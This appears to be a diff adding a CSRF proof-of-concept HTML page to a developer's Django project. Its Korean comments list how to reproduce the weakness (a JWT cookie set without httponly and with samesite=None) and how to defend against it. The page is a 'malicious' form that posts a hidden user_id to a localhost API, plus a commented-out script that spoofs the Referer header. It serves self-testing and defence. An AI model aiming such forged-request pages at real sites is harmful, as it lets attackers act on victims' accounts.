@@ -1,0 +1,47 @@
+<!-- 
+재현 방법
+
+django에서 set_cookie("jwt", token, httponly=False, secure=True, samesite=None)로 쿠키 설정
+-->
+
+<!-- 
+방어 방법
+1. set_cookie할 때 js로 쿠키를 읽을 수 없도록 httponly=True, csrf 방어를 위해 samesite=Lax 설정
+2. csrf token을 사용하여 요청을 검증 (이거 어떻게 하지?)
+-->
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Attack Example</title>
+  </head>
+  <body>
+    <h1>악의적인 페이지</h1>
+
+    <!-- 공격 버튼 추가 -->
+    <form action="https://localhost:443/api/me/" method="post">
+      <button>공격 실행</button>
+      <!-- user_id를 담는 hidden input 추가 -->
+      <input type="hidden" name="user_id" value="145128">
+    </form>
+
+    <!-- 헤더 레퍼럴을 조작하는 스크립트 추가 -->
+    <!-- <script>
+      // 폼이 제출될 때 실행되는 함수
+      document.querySelector('form').onsubmit = function(event) {
+      // XMLHttpRequest 객체 생성
+      var xhr = new XMLHttpRequest();
+      // 요청을 POST 방식으로 초기화
+      xhr.open('POST', 'https://localhost:443/api/me/', true);
+      // 헤더에 Referer 추가
+      xhr.setRequestHeader('Referer', 'https://malicious.example.com');
+      // 폼 데이터를 담는 객체 생성
+      var formData = new FormData(event.target);
+      // 요청 전송
+      xhr.send(formData);
+      // 기본 폼 제출 동작 방지
+      event.preventDefault();
+      };
+    </script> -->
+  </body>
+</html>
